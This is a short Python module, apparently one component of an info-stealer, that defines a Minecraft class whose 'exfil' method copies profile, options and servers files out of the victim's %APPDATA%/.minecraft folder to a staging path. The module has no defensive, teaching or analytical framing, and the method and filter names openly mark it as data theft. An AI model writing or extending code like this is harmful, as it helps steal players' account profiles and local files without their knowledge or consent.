from utils.dircopy import DirCopy

import os


APPDATA = os.getenv('appdata')

COPY_FILES = DirCopy.copy_files_from_dir


def valuable(path):

    if not 'profile' in path and not 'options' in path and not 'servers' in path:
        
        return False
    
    return True
    


class Minecraft:

    def exfil(path):

        COPY_FILES(os.path.join(APPDATA , '.minecraft') , path , None , valuable)